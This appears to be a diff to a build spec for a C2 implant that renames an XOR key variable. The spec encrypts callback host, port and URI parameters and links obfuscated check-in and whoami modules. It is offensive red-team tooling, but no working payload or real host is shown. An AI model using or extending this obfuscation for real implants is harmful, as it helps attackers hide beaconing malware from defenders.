@@ -40,14 +40,14 @@ x64:
 	dfr "resolve_unloaded" "strings"
 	
 	# Generate a random XOR key and patch it in.
-	generate $XORKEY 128
-	patch "XORKEY" $XORKEY
+	generate $ENC_KEY 128
+	patch "ENC_KEY" $ENC_KEY
 	
 	# Marshal and obfuscate string parameters from the C2.
 	pack $RAW_PARAMS "zziiz" %PAYLOAD_UUID %CALLBACK_HOST %CALLBACK_PORT %CALLBACK_HTTPS %CALLBACK_URI
 	
 	push $RAW_PARAMS
-	xor $XORKEY
+	xor $ENC_KEY
 	pop $ENC_PARAMS
 	
 	# Patch in obfuscated string parameters from the C2.
@@ -57,14 +57,14 @@ x64:
 	load "bin/pico_checkin.o"
 		make object +optimize
 		export
-		xor $XORKEY
+		xor $ENC_KEY
 		preplen
 		link "pico_checkin"
 		
 	load "bin/pico_whoami.o"
 		make object +optimize
 		export
-		xor $XORKEY
+		xor $ENC_KEY
 		preplen
 		link "pico_whoami"
 
